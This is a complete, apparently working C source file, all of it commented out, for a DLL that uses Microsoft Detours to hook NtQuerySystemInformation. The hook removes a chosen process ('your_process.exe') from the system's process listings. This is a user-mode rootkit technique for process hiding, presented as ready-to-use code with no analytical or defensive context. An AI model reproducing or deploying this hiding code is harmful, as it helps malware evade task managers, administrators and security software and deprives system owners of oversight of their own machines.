// #include <windows.h>
// #include <winternl.h>
// #include <ntstatus.h>
// #include <detours.h> // Include Detours header
//
// typedef NTSTATUS(WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
//     SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
//
// PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation;
//
// NTSTATUS WINAPI HookedNtQuerySystemInformation(
//     SYSTEM_INFORMATION_CLASS SystemInformationClass,
//     PVOID SystemInformation,
//     ULONG SystemInformationLength,
//     PULONG ReturnLength)
// {
//     NTSTATUS status = OriginalNtQuerySystemInformation(
//         SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
//
//     if (SystemInformationClass == SystemProcessInformation && status == STATUS_SUCCESS) {
//         PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
//         PSYSTEM_PROCESS_INFORMATION next = current;
//
//         while (current->NextEntryOffset) {
//             next = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)current + current->NextEntryOffset);
//             if (!wcsncmp(next->ImageName.Buffer, L"your_process.exe", next->ImageName.Length / sizeof(WCHAR))) {
//                 if (next->NextEntryOffset) {
//                     current->NextEntryOffset += next->NextEntryOffset;
//                 } else {
//                     current->NextEntryOffset = 0;
//                 }
//             } else {
//                 current = next;
//             }
//         }
//     }
//     return status;
// }
//
// BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
//     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
//         OriginalNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(
//             GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
//
//         DetourTransactionBegin();
//         DetourUpdateThread(GetCurrentThread());
//         DetourAttach(&(PVOID&)OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
//         DetourTransactionCommit();
//     }
//     return TRUE;
// }
